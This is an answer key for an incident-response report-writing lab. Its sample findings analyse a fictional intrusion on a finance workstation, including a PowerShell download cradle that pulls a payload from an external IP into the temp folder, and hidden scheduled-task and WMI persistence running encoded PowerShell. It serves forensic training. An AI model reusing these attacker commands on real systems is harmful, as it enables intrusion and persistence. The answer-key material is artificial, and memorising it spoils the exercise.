# Lab 13 — Task Answer Key

*Sample answers for the workbook-style Tasks 1–13 in `Labs/Lab13/ReadMe.md`. These are reference answers, not the only correct answers — your wording will legitimately differ, and on a writing lab it should. What is not negotiable is the reasoning: the confidence levels, the direction of the byte counts, and the boundary clauses. Lab 13 has no Hands-On Walkthrough, so this answer key is the only calibration for the lab.*

*Writing quality is the hardest thing in this book to self-assess, so the worked examples here are full documents rather than bullets. The executive brief in Task 12 and the findings in Tasks 3 and 4 are written out end to end so you can diff yours against them. Write yours before you read these. Reading a model answer first replaces the thinking the lab is for.*

---

## Task 1 — Sort the Output by Audience

| Audience | Decision in the next 24 h | Foreground | Omit, and why | Failure mode |
|---|---|---|---|---|
| Incoming responder (night shift) | Which of the three open threads to work first, and how far to get by 06:00 | FILESVR-03 is uncollected; `10.0.4.17` is unidentified; the two persistence mechanisms are documented but not removed. Give artifact paths and the exact filter that produced each finding. | Business impact language and the CFO's disclosure question — they cannot act on either and it displaces the open-thread list | Duplicated work; the FILESVR-03 lead goes cold overnight because the incoming shift did not know it was the top thread |
| IR manager | Whether to pull a second analyst on tonight, and whether to escalate to estate-wide containment | Scope is currently three hosts, one account; the growth trigger is the hash or C2 appearing on a fourth host; the resource ask is one analyst for FILESVR-03 collection tonight | Prefetch filenames, hash strings, script-block text — the parsing methodology is not what the decision turns on | Cannot allocate people; discovers scope growth from someone else at 07:00 |
| CFO / executive leadership | Whether to authorize the file-server outage, and whether to engage counsel today | Plain-language what happened, that the larger transfer to the outside address was *inbound*, and the two decisions with deadlines | Every event ID, IP, hash, filename, and tool name. Also the `svc-backup` rotation debate — unresolved internal argument, not a leadership decision | Leadership invents its own narrative, or freezes. Someone makes an external statement that the evidence does not support |
| Legal counsel | Whether a preservation hold is needed and whether the notification clock has started | Facts separated from inference; what is **not** established (the ~180 KB outbound is encrypted and uninspectable); custody and preservation status of the WKSTN-221 collection | Speculation about motive, any characterization of the actor, any estimate of notification obligation | Privileged work product contaminated with guesswork; a position taken today that the evidence contradicts next week |
| Finance team lead | What to tell their staff tomorrow morning and what to do about the workstation user | Their systems and accounts specifically; that the finance share may be offline tonight; that `payroll-admin` will need a password reset and what that means for them | The intrusion narrative, the C2 address, and anything about `10.0.4.17` — it is not their system and they will speculate about it | Shadow remediation. Users reset the wrong things, or work around the containment because nobody told them why the share is down |
| Legal + HR (IR-2024-11-009, HR-WS17) | Whether to proceed against the departed employee and what to put in a demand letter | Confirmed: the USB channel and the personal-OneDrive channel, each with the artifact classes supporting them. Probable-not-Confirmed: webmail. The three named files by name. | The intrusion case entirely. Also any characterization of intent — "took" is a finding, "stole" is a legal conclusion | A position taken on the webmail channel that provider-side logs later contradict, undermining the two channels that were solid |

**1. Which two deserve special care, and what goes wrong?**
Legal counsel and, where it applies, the regulator. Unlabelled inferences actively harm counsel, because counsel needs to know what a hostile party could and could not establish from the same evidence. If you write for counsel the way you write for a peer, "the attacker exfiltrated data" reads as an established fact rather than an unresolved question. Counsel will build a position on it. Regulators run on statutory clocks that start at discovery. You have to state the notification-relevant subset of your findings precisely, long before the investigation is finished. The tempting answer, "we'll know more next week," is exactly the wrong one for a clock that started today.

**2. Does the CFO already having heard it change what goes in, or only the order?**
Both, but the change to content is small and the change to order is large. Content: you now need one sentence that corrects the specific distortion. Otherwise "there was a hack in finance" becomes the frame she reads your brief through. Order: the correction goes in the Bottom line, not buried in "what we know." Leadership having a narrative before you arrive is the normal case, not the exception. The cadence discipline in §13.1.3 exists because someone else fills any silence from the IR team.

**3. What would you refuse to release at this stage?**
The characterization of `10.0.4.17` as "adversary-controlled." That phrase is an annotation on a flow record, not a finding. As of 17:30 UTC nobody has collected the host, identified its owner, or established that its behaviour was not some forgotten management process. Putting it in a document at this stage risks an internal accusation against whoever turns out to own it. What would change it: collection from the host, or a positive identification from DHCP/switch-port tracing that shows it is not an inventoried asset with a legitimate function. By 17 November that is exactly what happened, and *then* it is releasable.

---

## Task 2 — Fact, Inference, Assumption

| # | Statement | F/I/A | Underlying fact, or what breaks |
|---|---|---|---|
| 1 | Prefetch records run count 1, last run 14:21:03 | **F** | Directly readable from `prefetch.csv`, row `UPDATE.EXE-89A4B22C.pf` |
| 2 | `update.exe` executed once at 14:21:03 | **I** | From #1, plus the reasoning that Prefetch generation implies execution and that run count reflects total executions. Well-established, but still a step — and Prefetch run-count semantics differ across Windows versions. Corroborated independently by EID 4688. |
| 3 | The user opened `Q4_Payroll_Review.xlsm` at 14:18:55 | **I** | From #4. The LNK records file access under the user's session, not a human at the keyboard. |
| 4 | An LNK referencing the file was created at 14:18:55 | **F** | `lnk-files.csv` |
| 5 | The clock was accurate to within a few seconds of true UTC | **A** | If it fails, every relative-sequence argument in the report moves: the 43 s between the LNK and the 4688, the 29 s between the download starting and `update.exe` appearing, the 4 s between the two persistence mechanisms. The ordering survives a uniform offset. It does not survive a clock that was adjusted mid-window. |
| 6 | The attacker created the WMI subscription at 14:23:02 | **I** | From #7, plus the reasoning that the payload matches the 14:19:38 encoded command and that no legitimate process authored it. Strong, but it is attribution of an action to an actor, which #7 does not contain. |
| 7 | A WMI consumer with filter and binding exists, created 14:23:02 | **F** | `wmi-persistence.csv` |
| 8 | `10.0.4.17` is controlled by the attacker | **I** — and at 17:30 UTC on 14 Nov, a weak one | The facts are: an authenticated SMB session from that address, 4.2 MB read from the host, no CMDB record, and timing inside the incident window. The `Notes` column asserting adversary control is an annotation, not an artifact. |
| 9 | 4,218,421 bytes moved from WKSTN-221 to `10.0.4.17` | **F** | `network-flow.csv` — read the direction: source `10.0.4.17`, `BytesReceived` 4,218,421 |
| 10 | The data was finance documents | **I**, and unsupported | Nothing establishes file names or content. No host-side artifact records which files were read over that session. This is the statement that should not appear. |

**1. What bears on statement 5?**
The System-log clock change at 13:55:00, 24 minutes before the intrusion started: Microsoft-Windows-Kernel-General EID 1, previous time `13:54:58`, new time `13:55:00`. A +2 second adjustment, made by `svchost.exe`, which hosts the Windows Time service. It **strengthens** the assumption. It shows the time service actively correcting a two-second drift, which is what a normally functioning w32time does, and it bounds the plausible error to seconds rather than minutes. Write it down anyway. A reviewer who finds a clock change you did not mention will assume you missed it. A reviewer who reads your one-line treatment of it stops looking. Search for it by the right event ID. EID 4616 is the Security-log record of a time change, and `security-evtx.csv` holds none, so a hunt for 4616 finds nothing. An earlier System-log entry at 06:00:11 records a sync against `time.windows.com` with a `+0.124s` offset, which is the same argument from a second source.

**2. What has to be re-argued if statement 8 is wrong?**
Everything downstream of "the attacker moved to a second internal host." If `10.0.4.17` turns out to be, say, a forgotten backup collector, the 4.2 MB transfer stops being collection and becomes routine. The scope shrinks from three hosts to two. The credential-exposure argument for local admin passwords on `10.0.4.17` evaporates. The containment sequence in Task 7 was over-broad. The executive brief's line about data moving to an uninventoried internal computer was alarming and wrong. Note what does *not* move: Findings 1, 2, and 3 stand entirely, because they rest on different evidence. That separation is why you keep the categories apart: a bad inference should cost you one finding, not the report.

**3. Which would you not put in a report in any form?**
Statement 10. There is no evidentiary route to it from what exists. It is not even Possible in the §13.2.2 sense. "Possible" requires the evidence to be consistent with the claim in some specific way, and a byte count with no file-name attribution is consistent with any content whatsoever. Statement 8 is different. It is an inference with named facts underneath it that a reader can evaluate, so it belongs in the report as a Possible finding with the competing explanation stated.

---

## Task 3 — Rewrite One Finding at Four Confidence Levels

Subject: what left WKSTN-221 and where it went.

The task is not four strengths of one claim. It is four different claims, each at the level the evidence honestly supports. Most analysts get this case wrong in exactly one way: they read `2,415,891` as a big number and call it exfiltration without reading which column it is in.

### Confirmed

> **Finding — Bidirectional transfer between WKSTN-221 and 91.214.47.22, attributed to `update.exe`.**
> **Basis:** SRUM `Network Data Usage` records `update.exe` (`S-1-5-21-…-1142`) with 184,221 bytes sent and 2,415,891 bytes received in the interval rolled up at 2024-11-14 14:30:00 UTC (`srum.csv`). Perimeter flow records for 14:21:55–14:22:44 UTC show a TCP/443 session from 10.0.4.32 to 91.214.47.22 owned by `update.exe` carrying 184,221 bytes sent and 2,415,891 bytes received (`network-flow.csv`). The two sources are independent. The Windows Diagnostic Policy Service writes SRUM from per-process counters on the host, and the perimeter firewall generates the flow records. They agree to the byte.
> **Confidence:** Confirmed.
> **What this does not establish:** The content of the transfer in either direction. The session was TLS-encrypted and no packet capture covers the window. It does not establish that the outbound 184,221 bytes contained business data, or that the transfer constitutes exfiltration. The volume is asymmetric in the **inbound** direction by a factor of 13, which is the profile of a download, not an upload.

### Probable

> **Finding — The 184,221 bytes received by `powershell.exe` between 14:19:42 and 14:19:48 UTC became the `update.exe` binary on disk.**
> **Basis:** A TCP/443 flow to 91.214.47.22 owned by `powershell.exe` returned 184,221 bytes between 14:19:42 and 14:19:48 UTC (`network-flow.csv`). PowerShell Operational EID 4104 at 14:19:38 directs that download to `$env:TEMP\a.tmp`, and EID 4106 records `Invoke-WebRequest` stopping at 14:19:48.1 (`powershell-evtx.csv`). `a.tmp` was created in `C:\Users\payroll-admin\AppData\Local\Temp\` at 14:19:42.6 and closed at 14:19:48, inside the flow window, at **174,080 bytes** (`usn-journal.csv` `FileCreate` / `DataExtend` / `DataExtend|FileClose`; `mft.csv` entry 22421). The file is 10,141 bytes smaller than the bytes received. That gap is consistent with the TLS handshake, the HTTP response headers, and TLS and TCP/IP framing across 142 inbound packets. An EID 4104 at 14:20:07.6 XOR-decodes `a.tmp`, writes the result to `b.tmp`, and deletes `a.tmp`. The USN Journal records `b.tmp` created and written on MFT entry 22417 at 14:20:11.0–14:20:11.05, and `a.tmp` deleted at 14:20:11.1. An EID 4104 at 14:20:11.2 records `Move-Item $env:TEMP\b.tmp $env:TEMP\update.exe -Force`, and entry 22417 is renamed from `b.tmp` to `update.exe` at 14:20:11.25–14:20:11.5 (`RenameOldName` / `RenameNewName`). `update.exe` is 174,080 bytes on that entry (`mft.csv`, `amcache.csv`), the same length as `a.tmp`, as an XOR decode requires. Flow telemetry, the USN Journal, and script-block logging are independent sources. The *linkage* of content across them is inferential, and that is what holds this at Probable rather than Confirmed.
> **Confidence:** Probable. A single causal chain with no contradicting evidence, and every step of it is recorded. The sizes fit too: a downloaded file must be smaller than the bytes that carried it, and this one is smaller by an amount protocol overhead explains. What stops the finding at Probable is content. No hash was captured at the wire, and neither `a.tmp` nor the file that became `update.exe` survives, so nothing shows the bytes were identical at each step. The competing explanation is that the 174,080 bytes in `a.tmp` came from somewhere other than this flow. That would require a second transfer in the same six seconds that left no flow record.
> **What this does not establish:** That the retrieved content was byte-identical to what was written to disk. `a.tmp` was deleted at 14:20:11.1 and `update.exe` at 14:23:44, and no hash was captured at the wire. Nor are there three files here. `a.tmp` is the downloaded file, `b.tmp` is its decoded form, and `update.exe` is `b.tmp` renamed. A rename keeps the MFT record, so `mft.csv` shows entry 22417 only under its current name, `update.exe`. The MFT shows a record's current name, and the USN Journal shows its history: only the journal remembers that entry 22417 was once `b.tmp`. Counting three files, or reading the missing `b.tmp` MFT row as a gap in the collection, is the most common error in reading this chain.

### Possible

> **Finding — The 4,218,421 bytes read from WKSTN-221 by 10.0.4.17 constituted collection of user data.**
> **Basis:** Flow records show an inbound SMB/445 session from 10.0.4.17 to 10.0.4.32 between 14:31:05 and 14:33:14 UTC, carrying 11,421 bytes to the host and 4,218,421 bytes from it (`network-flow.csv`). The session is bracketed by Security EID 4624 type 3 (NtLmSsp) for `payroll-admin` from 10.0.4.17 at 14:31:05 and EID 4634 for the same session at 14:38:00 (`security-evtx.csv`). The address 10.0.4.17 does not appear in the asset inventory.
> **Confidence:** Possible. The evidence is equally consistent with an unrecorded management, inventory, or profile-synchronization process reading from the host over an authenticated SMB session. The flow record establishes volume and direction only. Nothing on WKSTN-221 records which files were read. That competing explanation is why this is Possible and not Probable.
> **What this does not establish:** Which files, which directories, or whether any of it was business data. Object-access auditing (EID 4663/5145) is not enabled on this workstation, so no host-side record of the read exists.

### Undetermined

> **Finding — Whether any organizational data left the network perimeter as a result of this intrusion: Undetermined.**
> **Basis:** Three sources would have answered this and none is available. (a) No packet capture exists for any point in the network path for 14:19–14:35 UTC, so the 184,221 bytes sent to 91.214.47.22 cannot be inspected. (b) 10.0.4.17 had not been located or collected as of 2024-11-14 17:30 UTC, so its onward network activity for the period after 14:33:14 is unknown. (c) Perimeter flow records are retained for 14 days. Dwell time is itself Undetermined. The four failed logons from 185.193.126.47 at 04:00 UTC are unresolved, and the host Security log cannot be assessed before 2024-11-13 (Finding 1). This investigation therefore cannot show that the 14-day flow window covers the whole intrusion.
> **Confidence:** Undetermined. The absence of observed exfiltration is not evidence of its absence for the periods and paths these three sources would have covered.
> **Recommended action:** Locate and collect 10.0.4.17 as the top priority; its outbound flow records for 14:33 onward are the single source most likely to resolve this. Tracked as Recommendation 1.

**1. Why is the Undetermined source missing?**
Three of the four reasons appear in this case, which is unusual and useful. Never generated: the packet capture. There is no capability, so no data was ever created. Not retained: the 14-day flow window. Not yet collected: 10.0.4.17 and FILESVR-03. Cleared: none, in this case. Say so explicitly, because a report that does not distinguish "the attacker destroyed this" from "we never had it" invites the reader to assume the worse of the two.

The most embarrassing to write is **not yet collected**, because it is your own fault and fixable today. Write it anyway, because it is also the one a reader can act on. A gap you own with a date against it reads as control. The same gap, discovered by an auditor in four months, reads as negligence.

**2. Splitting the Probable finding.**
The version above survives, but the first draft most people write does not. The common draft reads "…were the `update.exe` binary, which was second-stage malware retrieved from attacker infrastructure." The second clause is a separate claim at a lower level. No sample was recovered, no analysis exists, and "malware" is a characterization the evidence does not carry. Split it out. If you cannot support the split-out half at any level, it does not belong in the report.

**3. The draft sentence, decomposed.**

| Element of "likely exfiltrated a significant amount of sensitive payroll data" | Verdict |
|---|---|
| "exfiltrated" (data left the organization) | **Neither supported nor refuted.** This is the Undetermined finding. |
| "a significant amount" | **Contradicted, as written.** The outbound volume to the C2 was 184,221 bytes. The 2,415,891-byte figure the author was reaching for went the other way. |
| "sensitive payroll data" | **Unsupported.** No artifact attributes file names or content to any transfer in this case. |
| "to their command-and-control server at 91.214.47.22" | **Supported for the destination** — that a transfer occurred to that address is Confirmed. Not supported for what was in it. |
| "likely" | **Meaningless.** It is not one of the four levels and it has no published definition in the report. |

---

## Task 4 — Build Three Findings in the Four-Part Form

### Finding 1 — Initial access and execution chain on WKSTN-221

> **Basis:** An LNK file referencing `Q4_Payroll_Review.xlsm` was created at 2024-11-14 14:18:55 UTC (`lnk-files.csv`). At 14:19:38 UTC, Security EID 4688 records `POWERSHELL.EXE` created with parent `OUTLOOK.EXE` and an `-EncodedCommand` argument (`security-evtx.csv`). PowerShell Operational EID 4104 records the corresponding script block in the same second: `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp` (`powershell-evtx.csv`). A TCP/443 flow to 91.214.47.22 owned by `powershell.exe` returned 184,221 bytes at 14:19:42–14:19:48 (`network-flow.csv`). `a.tmp` was created in `C:\Users\payroll-admin\AppData\Local\Temp\` at 14:19:42.6 and written until 14:19:48, inside that flow, at 174,080 bytes (`mft.csv`, `usn-journal.csv`). A 4104 at 14:20:07.6 XOR-decodes `a.tmp` into `b.tmp` and deletes `a.tmp`, and a 4104 at 14:20:11.2 moves `b.tmp` to `update.exe`. The USN Journal records `b.tmp` created on MFT entry 22417 at 14:20:11, `a.tmp` deleted at 14:20:11.1, and entry 22417 renamed to `update.exe` at 14:20:11.25–14:20:11.5 (`usn-journal.csv`). `update.exe` is 174,080 bytes on that entry, with SHA-256 `4f8b2c1a…12345` (`mft.csv`, `amcache.csv`). It executed at 14:21:03 UTC: Prefetch `UPDATE.EXE-89A4B22C.pf` records run count 1 (`prefetch.csv`), corroborated by EID 4688. Different subsystems write process-creation auditing and PowerShell script-block logging, so the two are independent.
> **Confidence:** Confirmed, for the execution chain from `OUTLOOK.EXE` to the execution of `update.exe`.
> **What this does not establish:** That a person at the keyboard opened an attachment. The LNK records file access under the `payroll-admin` session, not a human action. That inference is **Probable** and is recorded separately. That `Q4_Payroll_Review.xlsm` was the delivery vehicle. The file is still on disk in `Documents\` (`mft.csv`, entry in use), but nobody has analysed its content, and no mail-gateway record has been obtained. The 43-second interval between the LNK creation and the process spawn is consistent with a causal relationship but does not demonstrate one. That this was the sole entry point. Four failed EID 4625 network logons from 185.193.126.47 at 04:00–04:00:42 UTC the same morning are unresolved. The Security log on this host wraps in approximately 36 hours, so activity before 2024-11-13 cannot be assessed from the host.

### Finding 2 — Two persistence mechanisms created on WKSTN-221 at 14:22:58 and 14:23:02 UTC

> **Basis:** A scheduled task `\Microsoft\Windows\WindowsUpdate\WindowsUpdateSync` was created at 14:22:58 UTC with author `FINANCE\payroll-admin`, a logon trigger for that account, and the action `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <payload>` (`scheduled-tasks.csv`). At 14:23:02 UTC a WMI event subscription was created in `root\subscription`: `__EventFilter` `WindowsUpdateFilter` querying `Win32_PerfFormattedData_PerfOS_System` for `SystemUpTime` between 200 and 320 seconds, a `CommandLineEventConsumer` named `WindowsUpdateConsumer` carrying the same command line, and a filter-to-consumer binding (`wmi-persistence.csv`). The encoded payload in both is byte-identical to the `-EncodedCommand` in the 14:19:38 EID 4688, decoding to `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp`.
> **Confidence:** Confirmed, for the creation of both mechanisms.
> **What this does not establish:** That either mechanism executed. The scheduled task reports `LastTaskResult` `0x41303` and a `LastRunTime` of `1999-11-30 00:00:00`, the sentinel value for a task that has never run. The WMI consumer's trigger fires 200–320 seconds after boot. WKSTN-221 last booted at 02:14:01 UTC on 2024-11-14, before the subscription existed, so it has had no opportunity to fire. No execution artifact for either command line exists. It also does not establish that these are the only persistence mechanisms present. Run/RunOnce keys, Winlogon `Shell` and `Userinit`, and the Services hive were enumerated and contained no attacker-authored entries. COM hijacks, IFEO debuggers, AppInit DLLs, BITS jobs, and Office add-ins were not enumerated in this collection.

**Q1 — split or combine?** Combined, as above. The deciding argument is Rule 2 in §13.2.2: a finding carries exactly one confidence level. The *claim* here is "two persistence mechanisms were created," and that claim is Confirmed for both at the same level from the same quality of evidence. The thing that differs between them, whether each fired, is not part of the claim. It sits in the boundary clause, which is exactly where differing status belongs. Splitting is also defensible, and some reviewers prefer it, because the two mechanisms have different eradication urgency. The WMI subscription is live and will fire on the next boot, and the task is dormant. If your report drives an eradication plan directly off finding numbers, split them.

### Finding 3 — Explicit-credential authentication from WKSTN-221 to FILESVR-03

> **Basis:** Security EID 4648 at 14:33:18 UTC records a logon attempted with explicit credentials: `SubjectUserName=payroll-admin`, `TargetUserName=payroll-admin`, `TargetServerName=FILESVR-03`, `ProcessName=C:\Windows\System32\cmd.exe` (`security-evtx.csv`). One second later, EID 4688 records `C:\Windows\System32\net.exe` created with parent `cmd.exe` and the command line `net use \\FILESVR-03\Finance$ /user:FINANCE\payroll-admin`. At 14:33:42, EID 4688 records `net1.exe` with the same arguments and parent `net.exe`. Flow records show SMB/445 from 10.0.4.32 to 10.0.4.18 at 14:33:18–14:33:42 (2,184 bytes sent, 18,421 received) and 14:33:42–14:35:00 (184,221 bytes sent, 8,421 received) (`network-flow.csv`).
> **Confidence:** Confirmed, that the authentication attempt and the share connection were initiated from WKSTN-221 using the `payroll-admin` credential.
> **What this does not establish:** Whether the authentication succeeded, what was accessed on FILESVR-03, or whether any file content was read from the `Finance$` share. Every artifact above is source-side. The destination-side records that would answer it have not been collected as of 2024-11-14 17:30 UTC. They are Security EID 4624 type 3 on FILESVR-03, and object-access EID 5145/4663 if file-share auditing is enabled there. Note also the direction of the flow volumes: 184,221 bytes were sent *from* WKSTN-221 *to* the file server, and 8,421 bytes came back. That directionality does not support a claim that file content was retrieved from the share.

**Q2 — the artifact that moves Finding 3 up a level.** Host: FILESVR-03. Artifact: `Security.evtx`. Field: EID 4624 with `LogonType=3`, `TargetUserName=payroll-admin`, `IpAddress=10.0.4.32`, in the 14:33:18–14:35:00 window. Its presence confirms the authentication succeeded. Its absence, in a log with confirmed coverage of that window, makes the failure of the attempt Confirmed, which is equally valuable. The second artifact, if share auditing is enabled, is EID 5145 (`A network share object was checked to see whether client can be granted desired access`) with the object names. That is what turns "connected to the share" into "read these files."

**Q3 — the negative, written safely.**

> The following persistence locations were enumerated on WKSTN-221 from the triage collection and contained no attacker-authored entries: `HKLM\SOFTWARE` and `HKCU` `Run` and `RunOnce`, `Policies\Explorer\Run`, the `WOW6432Node` `Run` key, Winlogon `Shell` and `Userinit`, and the Services hive. The following were **not** enumerated in this collection and no statement is made about them: COM hijacks, Image File Execution Options debuggers, AppInit and AppCert DLLs, LSA and SSP providers, Office add-ins and templates, BITS jobs, and accessibility-tool replacements. See Gap L-2.

Compare that with "no evidence of additional persistence was identified." A hostile reviewer reads that as a clean bill of health across all 15 locations, and you cannot support it.

---

## Task 5 — The Same Finding, Three Audiences

**Incoming responder:**

> Confirmed bidirectional transfer between WKSTN-221 (10.0.4.32) and 91.214.47.22:443, attributed to `update.exe`: **184,221 bytes out, 2,415,891 bytes in**, 14:21:55–14:22:44 UTC. SRUM and perimeter flow agree exactly — independent sources. Read the direction before you write anything about this: the large number is inbound. Separately, an inbound SMB session from 10.0.4.17 pulled 4,218,421 bytes off this host between 14:31:05 and 14:33:14, under a type-3 `payroll-admin` logon. **Not yet checked:** 10.0.4.17 is not in the CMDB and has not been located. Nothing has been collected from it, and its outbound flow after 14:33 is unknown. That is the top open thread, ahead of FILESVR-03. Flow CSV is at `\cases\IR-2024-11-014\WKSTN-221\network-flow.csv`. The 4624/4634 pair bracketing the session is in `security-evtx.csv`.

**IR manager (107 words):**

> Confirmed data movement in two directions. The workstation exchanged traffic with an external address — 180 KB out, 2.4 MB in. The large volume was inbound, so the "they stole a lot of data" version is not what the evidence says, and I need that corrected before it reaches the CFO. The more concerning number is internal: 4.2 MB was read off the workstation by 10.0.4.17, which is not in our asset inventory and which nobody has located. Scope is three hosts. It grows if 10.0.4.17 turns out to have talked to anything else. **Ask:** one network engineer for switch-port tracing tonight, and one analyst for FILESVR-03 collection.

**CFO (75 words):**

> Data moved both ways between the affected finance workstation and an address outside the company. More came in than went out — about 2.4 megabytes in, about 180 kilobytes out. Separately, about 4 megabytes was copied from that workstation to another computer inside our own network that is not on our asset list. We do not yet know what that second computer is or where the data went next. We expect to know by 20:00 today.

**Legal counsel, IR-2024-11-009 (HR-WS17):**

> Three files were identified by legal as in scope: `Q4_Customer_Pricing.xlsx`, `Pricing_Strategy_Confidential.docx`, and `Margins_Q3.xlsx`.
>
> **Confirmed — removable media.** All three files were opened from `E:\Confidential\Pricing\` between 17:44:18 and 17:45:32 UTC on 2024-11-12, on a Kingston DataTraveler 3.0 (serial `001A92053B7CBE3196B40A0F`) first installed at 17:42:08 and removed at 17:58:30 the same day. Four independent artifact classes support this: the USBSTOR device installation record, the `MountedDevices` binding of that volume to `E:`, shellbag entries recording navigation into `E:\Confidential\Pricing\`, and three LNK files carrying the device's volume serial number.
>
> **Confirmed — personal cloud account.** Two of the three files — `Q4_Customer_Pricing.xlsx` and `Pricing_Strategy_Confidential.docx` — were synchronized to a personal OneDrive account (`hr.user.personal@outlook.com`, distinct from the corporate account) between 17:46 and 17:49 UTC. Supported by the personal account's registry entry, the sync-engine database rows, the OneDrive client logs, and SRUM outbound byte counts for `OneDrive.exe` in the same window. `Margins_Q3.xlsx` does **not** appear in the sync database and is not established as having gone by this route.
>
> **Probable, not Confirmed — webmail.** The Edge history records navigation to `outlook.live.com` at 17:51:04 UTC and SRUM shows outbound bytes for `msedge.exe` consistent with a small upload. No file name, attachment, or message content is recoverable from the host. This channel cannot be raised above Probable without Microsoft 365 provider-side mail-flow logs. If that matters to the position you are taking, the logs are obtainable and we should request them.
>
> **What is not established:** That any file was received, opened, or retained by a third party. All of the above establishes movement off the host, not receipt by anyone. `C:\HR\Pricing\` was also deleted at 17:57:42 UTC. That deletion is itself an observation, but it does not establish intent, and I would not characterize it in a filing.

**1. Where the uncertainty lives in each version.**
Responder: "**Not yet checked:** 10.0.4.17 … has not been located." IR manager: "It grows if 10.0.4.17 turns out to have talked to anything else." CFO: "We do not yet know what that second computer is or where the data went next. We expect to know by 20:00 today." Same fact, three registers. The executive version is where the temptation to smooth the uncertainty away is strongest, and where the reader needs it most.

**2. What the 80-word limit cost.**
The `update.exe` attribution. The CFO version does not say that an attacker-controlled program, rather than the user's browser, generated the outbound traffic. The risk accepted is that she reads it as ambiguous activity rather than attacker activity, and under-weights the second decision: engaging counsel. The mitigation is that "the affected finance workstation" and the Bottom line of the brief already establish that the machine was compromised. The sentence does not have to re-establish it.

**3. Why the legal version inverts the emphasis.**
Counsel's job is to anticipate what the other side will establish. What damages a position is not a weak finding but a strong finding that was overstated and then walked back. Telling counsel up front that webmail is Probable-not-Confirmed lets them build a case on the two Confirmed channels and treat webmail as upside. Telling them "we found three channels" and having the third collapse under provider-side logs undermines the two that were solid.

---

## Task 6 — Run the Adversarial Reviewer Test

| # | Sentence | What fails | What the evidence supports | Verdict |
|---|---|---|---|---|
| 1 | "…a sophisticated actor." | "Sophisticated" — an impression of the attacker, not a property of the evidence. On the §13.2.2 banned list. It also has a habit of appearing in press coverage. | Nothing. The tooling observed is a download cradle, a commodity-looking binary, a scheduled task, and a WMI subscription — none of which distinguishes capability level. | Strike entirely. |
| 2 | "…gaining access via a phishing email…" | "Via a phishing email" is an inference stated as an observation. The message was never recovered and no mail-gateway record exists. | An LNK for `Q4_Payroll_Review.xlsm` at 14:18:55 and an `OUTLOOK.EXE` → `POWERSHELL.EXE` spawn at 14:19:38. The email itself is not in evidence. | Rewrite as Probable with the boundary stated. |
| 3 | "…quickly established persistence and moved laterally … using advanced techniques." | Three failures. "Quickly" is unquantified when you have second-precision timestamps. "Moved laterally through the finance environment" implies multi-host compromise; two hosts were touched and neither is established as compromised. "Advanced" is a banned adjective. | Persistence created at 14:22:58 and 14:23:02, neither executed. One authentication to FILESVR-03 at 14:33:18, outcome unknown. One inbound SMB session from 10.0.4.17. | Split into three findings at three different levels. |
| 4 | "…likely exfiltrated a significant amount of sensitive payroll data to their C2…" | "Likely" is undefined. "Significant amount" is unquantified. "Sensitive payroll data" is an uncategorized data claim that, in front of counsel, can trigger notification analysis for data that was never touched. And the direction is wrong. | 184,221 bytes sent to the C2; 2,415,891 received from it. Exfiltration of organizational data is Undetermined. | The most damaging sentence in the paragraph. Replace with the four findings from Task 3. |
| 5 | "…before we were able to respond." | It is false, and it hides the real lesson. The alert fired at 14:21 and IR was engaged at 14:23, while the attacker was still active. It is also a self-assessment, not a finding, and an insurer will read it. | The measurable facts: attacker on-host activity 14:18:55–14:38:00; EDR alert 14:21; escalation 14:23; decision to monitor and collect before isolating 14:25. The deletion of `update.exe` at 14:23:44, the inbound logon from 10.0.4.17 at 14:31:05, and the FILESVR-03 logon at 14:33:18 all came after IR engaged. State the intervals and let the reader assess them. | Replace with the interval table. |
| 6 | "No evidence of further lateral movement was identified." | The classic unqualified negative. It will be read as "the attacker did not move further," which is not supportable when the destination host was never collected and the source that would show it wraps in 36 hours. | Two hosts contacted; neither collected. The statement should be Undetermined with the named missing sources. | Rewrite per §13.2.4 Example 3. |
| 7 | "The host has been cleaned and returned to the user." | It is not true — as of 17:30 on 14 November nothing has been contained, let alone cleaned. It is also a claim about response actions inside a findings section. | Nothing. | Strike, and find out where the author got it. |

**The five questions, applied to the paragraph.**

- *Which word is doing work the evidence does not support?* "Sophisticated," "advanced," "quickly," "significant," "sensitive," "likely," "exfiltrated," "cleaned." Eight in six sentences.
- *If this artifact could be produced by benign activity, did I say so and rule it out?* No. The SMB read from 10.0.4.17 has a plausible benign explanation that the draft never names, let alone rules out.
- *Does any conclusion rest on a single source described as if it were several?* Yes, and this is the worst one. "Exfiltrated a significant amount" rests on a single number — 2,415,891 — read out of the wrong column of one file. The phrasing implies a body of corroborating evidence that does not exist.
- *Is any assumption stated only implicitly?* Yes. The draft assumes that the host clock was accurate, and the Kernel-General clock-change event at 13:55:00 bears on it. It also assumes that `10.0.4.17` is attacker-controlled, which it asserts nowhere but which "moved laterally" depends on.
- *Would removing one finding collapse three others?* Yes. Everything after "gaining access via a phishing email" is chained to it, and the email is not in evidence. If the entry point turns out to be the 04:00 authentication attempts from 185.193.126.47, sentences 2 through 5 all need re-arguing. Those dependencies are invisible in the draft.

**The rewritten set** is Findings 1, 2, and 3 from Task 4, plus the four confidence-levelled findings from Task 3, plus:

> **Finding 6 — Lateral movement beyond FILESVR-03 and 10.0.4.17: Undetermined.**
> **Basis:** Security logs on WKSTN-221 were reviewed for EID 4624, 4625, 4648, and 4672 across the retained window. One outbound authentication event was identified: the explicit-credential logon (EID 4648) to FILESVR-03 at 14:33:18 (Finding 3). However, the Security log on this host is capped at 20 MB and rolls over in approximately 36 hours. No Windows Event Forwarding is configured, so no copy exists off the host. Neither FILESVR-03 nor 10.0.4.17 has been collected. Domain-controller logs have not yet been reviewed.
> **Confidence:** Undetermined. The absence of recorded authentications on a single source with a 36-hour window is not evidence of absence.
> **Recommended action:** Hunt the `update.exe` SHA-256 and the C2 address across all endpoints via EDR, which does not depend on the host Security log. Collect DC01 and DC02 Security logs for 4624/4648/4768/4769/4776 referencing `payroll-admin`. Tracked as Recommendations 2 and 3.

**On the `Notes` column.** It is worth nothing as evidence and it is dangerous in a Basis clause. The `network-flow.csv` note "Large outbound transfer — possible exfil" is a previous analyst's hypothesis embedded in a data file. Here, the two byte-count columns sitting next to it contradict it. Rule for your notes:

> Annotation, description, and severity columns in parser and platform output are prior analysis, not artifact content. You may cite them as "a prior analyst assessed X," and they are useful as leads. They cannot appear in a finding's Basis as though they were a field the artifact generated. Where an annotation conflicts with the underlying values, the values win, and the conflict deserves a sentence in the report.

